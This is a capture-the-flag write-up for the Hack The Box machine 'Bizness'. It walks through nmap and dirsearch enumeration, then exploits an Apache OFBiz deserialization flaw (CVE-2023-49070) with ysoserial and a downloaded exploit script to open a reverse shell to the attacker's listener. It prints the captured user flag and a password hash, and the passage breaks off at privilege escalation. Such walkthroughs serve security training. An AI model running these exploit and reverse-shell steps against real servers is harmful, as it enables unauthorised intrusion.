 
# Bizness

<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/b394bd03-e005-41b0-bb83-60f236f052d4" />
</p>



Embrace the dawn of a fresh season as we unveil the latest additions to the gaming arena. Welcome to the exhilarating Season 4, where innovation and excitement collide. Leading the charge is the formidable Bizness, a dynamic machine that promises both challenge and reward. Boasting a lucrative 20-point bounty and an accessible easy difficulty level, Bizness beckons all daring adventurers. Without further ado, let's dive headfirst into the world of opportunities and embark on a thrilling journey – it's time to engage in some serious 'bizness'!


## Setting the Stage 
Before delving into the intricacies, our initial step involves the addition of the IP and domain to the crucial /etc/hosts file. This crucial setup ensures that the IP is recognized, laying the foundation for seamless interactions. Execute the command 'sudo nano /etc/hosts' to initiate this imperative configuration.

```bash
echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts 
```

## Enumeration with Nmap
Nmap serves as the indispensable compass, unveiling the intricacies of system architecture and potential vulnerabilities with its versatile commands

```bash
nmap -Pn -sC -sV 10.10.11.252
```
As we initiate enumeration, a preliminary port scan discloses the accessibility of ports 22, 80, and 443.


## Exploring the Vast Horizons of the Web .
Now let’s move to the next step for enumeration. Let’s use dirsearch tool to search for other endpoints.

```bash
sudo apt-get install dirsearch
dirsearch -u https://bizness.htb -e*
```

After using dirsearch we get login endpoints.

After doing directory enumeration we see there directory of /control/login 

## Art of Exploitation: Navigating Security Challenges :
"Upon entering the login page, it becomes evident that the system employs the Apache OFBiz web framework. Subsequent investigation yielded the following insights."


_There Vulnerability of ofbiz-CVE-2023–49070-RCE-POC_

- Link of exploitation: — https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC/tree/main?tab=readme-ov-file


```bash
sudo update-alternatives — config java

use “ 1 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 manual mode”
```

Further exploration revealed....
```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

```bash
wget https://raw.githubusercontent.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC/main/exploit.py
```

Now we see that we can execute any command by using the above exploit . So, we try to get reverse shell.

## Executing the Payload

```bash
python3 exploit.py https://bizness.htb/ shell ip:4444
```

Subsequently, execute on a second terminal.
```bash
nc -lnvp 4444
```


then you will get user shell ....

## User Flag :

Upon successfully obtaining the reverse shell, navigating directories became a challenge. Fret not, as I've got you covered. Change the directory to /home/ofbiz, where you'll find a text file named user.txt. Simply execute 'cat' on the file, and voila! You've secured the user flag. 


```bash
ofbiz@bizness:/opt/ofbiz$ cd /home/ofbiz
cd /home/ofbiz
ofbiz@bizness:~$ ls
ls
user.txt
ofbiz@bizness:~$ cat user.txt
cat user.txt
d96f0aefb0311de8c1da1c174db554d7
```


We successfully secured the User flag as 'd96f0aefb0311de8c1da1c174db554d7' However, the journey to the root flag is yet to be completed. No need to worry, though—I've got your back.

Upon investigation, we uncovered the Derby database and a hash: '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN.' Breaking it down, '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN' signifies the use of the SHA-1 hashing algorithm ('$SHA$'), 'd' for salt, and the remaining string as the hashed value. Let's dive deeper into the data to uncover the next steps.


## Privilege Escalation: Elevating System Access Safely 

Execute this Python script to decode the SHA-1 hash.

```bash
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN


